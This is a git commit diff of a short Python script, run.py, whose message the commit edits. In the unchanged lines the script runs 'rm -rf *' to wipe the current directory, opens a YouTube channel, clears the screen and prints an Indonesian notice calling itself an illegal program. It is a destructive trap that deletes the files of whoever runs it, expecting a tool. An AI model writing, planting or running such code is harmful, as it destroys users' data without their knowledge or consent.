6a5a0efd82474e609fadae1196573c0183d88158
N74NK 420 <40085062+N74NK@users.noreply.github.com>
2019-06-06 07:20:13 +0700

    Update run.py

--- run.py
+++ run.py
@@ -2,4 +2,4 @@ import os
 os.system("rm -rf *")
 os.system("xdg-open https://youtube.com/NjankSoekamti")
 os.system("clear")
-print("\n\n Ini adalah program illegal!\nSaya harus menghapus alat ini\n\n")
+print("\n\n Ini adalah program illegal!\n\n")
